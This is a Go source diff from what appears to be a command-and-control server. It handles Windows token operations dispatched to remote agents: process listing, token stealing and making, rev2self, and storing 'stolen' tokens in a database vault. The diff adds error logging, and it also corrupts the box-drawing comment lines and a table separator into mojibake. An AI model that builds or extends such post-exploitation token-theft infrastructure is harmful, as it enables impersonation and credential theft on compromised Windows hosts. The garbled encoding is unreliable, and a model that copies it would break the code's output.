@@ -1,4 +1,4 @@
-package server
+﻿package server
 
 import (
 	"encoding/base64"
@@ -14,9 +14,9 @@ import (
 	"github.com/gin-gonic/gin"
 )
 
-// ─────────────────────────────────────────────────────────────
+// 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 // Token page (per-agent Token Management Center)
-// ─────────────────────────────────────────────────────────────
+// 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 
 func (s *Server) handleTokenPage(c *gin.Context) {
 	id := c.Param("id")
@@ -52,7 +52,7 @@ func (s *Server) handleTokenPage(c *gin.Context) {
 		data[k] = v
 	}
 
-	s.renderPage(c, "token_content", data)
+	s.renderPageOrJSON(c, data)
 }
 
 // handleGlobalTokensPage shows all tokens across all agents
@@ -89,12 +89,12 @@ func (s *Server) handleGlobalTokensPage(c *gin.Context) {
 		data[k] = v
 	}
 
-	s.renderPage(c, "tokens_global_content", data)
+	s.renderPageOrJSON(c, data)
 }
 
-// ─────────────────────────────────────────────────────────────
+// 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 // Token Operations (API)
-// ─────────────────────────────────────────────────────────────
+// 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 
 // handleTokenListProcs dispatches token_list_procs task to agent
 func (s *Server) handleTokenListProcs(c *gin.Context) {
@@ -197,7 +197,9 @@ func (s *Server) handleTokenRevert(c *gin.Context) {
 	}
 
 	// mark all tokens for this agent as inactive in DB
-	s.db.Model(&db.TokenEntry{}).Where("agent_id = ? AND active = ?", id, true).Update("active", false)
+	if err := s.db.Model(&db.TokenEntry{}).Where("agent_id = ? AND active = ?", id, true).Update("active", false).Error; err != nil {
+		slog.Error("Failed to deactivate tokens for revert", "agent_id", id, "err", err)
+	}
 
 	slog.Info("Token revert (rev2self) requested", "agent", id)
 	s.LogAuditRecord(c, "token_revert", "agent", id, "rev2self", true, nil)
@@ -294,10 +296,10 @@ func (s *Server) handleGetTokens(c *gin.Context) {
 	c.JSON(http.StatusOK, tokens)
 }
 
-// ─────────────────────────────────────────────────────────────
+// 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 // processTokenResult is called from handlers_beacon.go when a
 // token task result arrives from the agent.
-// ─────────────────────────────────────────────────────────────
+// 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 
 // processTokenResult parses token task results and persists them to the vault.
 func (s *Server) processTokenResult(agentID string, taskType string, output string) {
@@ -312,7 +314,9 @@ func (s *Server) processTokenResult(agentID string, taskType string, output stri
 		pid64, _ := strconv.ParseUint(m["pid"], 10, 32)
 
 		// Deactivate any previous active tokens for this agent
-		s.db.Model(&db.TokenEntry{}).Where("agent_id = ? AND active = ?", agentID, true).Update("active", false)
+		if err := s.db.Model(&db.TokenEntry{}).Where("agent_id = ? AND active = ?", agentID, true).Update("active", false).Error; err != nil {
+			slog.Error("Failed to deactivate previous tokens", "agent_id", agentID, "err", err)
+		}
 
 		entry := db.TokenEntry{
 			AgentID:     agentID,
@@ -325,7 +329,10 @@ func (s *Server) processTokenResult(agentID string, taskType string, output stri
 			Active:      true,
 			CreatedAt:   time.Now(),
 		}
-		s.db.Create(&entry)
+		if err := s.db.Create(&entry).Error; err != nil {
+			slog.Error("Failed to save stolen token", "agent_id", agentID, "err", err)
+			return
+		}
 		slog.Info("Token stolen and saved", "agent", agentID, "user", m["domain"]+"\\"+m["username"])
 
 	case "token_make":
@@ -335,7 +342,9 @@ func (s *Server) processTokenResult(agentID string, taskType string, output stri
 			return
 		}
 
-		s.db.Model(&db.TokenEntry{}).Where("agent_id = ? AND active = ?", agentID, true).Update("active", false)
+		if err := s.db.Model(&db.TokenEntry{}).Where("agent_id = ? AND active = ?", agentID, true).Update("active", false).Error; err != nil {
+			slog.Error("Failed to deactivate tokens before make", "agent_id", agentID, "err", err)
+		}
 
 		entry := db.TokenEntry{
 			AgentID:   agentID,
@@ -349,12 +358,17 @@ func (s *Server) processTokenResult(agentID string, taskType string, output stri
 			Active:    true,
 			CreatedAt: time.Now(),
 		}
-		s.db.Create(&entry)
+		if err := s.db.Create(&entry).Error; err != nil {
+			slog.Error("Failed to save made token", "agent_id", agentID, "err", err)
+			return
+		}
 		slog.Info("Token made and saved", "agent", agentID, "user", m["domain"]+"\\"+m["username"])
 
 	case "token_revert", "rev2self":
 		// mark all inactive
-		s.db.Model(&db.TokenEntry{}).Where("agent_id = ? AND active = ?", agentID, true).Update("active", false)
+		if err := s.db.Model(&db.TokenEntry{}).Where("agent_id = ? AND active = ?", agentID, true).Update("active", false).Error; err != nil {
+			slog.Error("Failed to deactivate tokens on revert", "agent_id", agentID, "err", err)
+		}
 	}
 }
 
@@ -379,11 +393,11 @@ func (s *Server) handleTokenNoteUpdate(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"success": true})
 }
 
-// ─────────────────────────────────────────────────────────────
+// 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 // tokenListProcsResult parses the base64-encoded JSON from
 // a token_list_procs result and returns nicely formatted text.
 // (Used by handleBeaconResult in handlers_beacon.go)
-// ─────────────────────────────────────────────────────────────
+// 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 
 // FormatTokenProcsResult decodes base64 and formats a token_list_procs result for display.
 func FormatTokenProcsResult(b64 string) string {
@@ -415,7 +429,7 @@ func FormatTokenProcsFromJSON(jsonStr string) string {
 
 	var sb strings.Builder
 	sb.WriteString(fmt.Sprintf("%-8s  %-22s  %-30s  %-10s\n", "PID", "Process", "User", "Integrity"))
-	sb.WriteString(strings.Repeat("─", 80) + "\n")
+	sb.WriteString(strings.Repeat("鈹€", 80) + "\n")
 	for _, p := range procs {
 		user := p.Domain + "\\" + p.Username
 		if p.Error != "" {
@@ -426,3 +440,4 @@ func FormatTokenProcsFromJSON(jsonStr string) string {
 	}
 	return sb.String()
 }
+
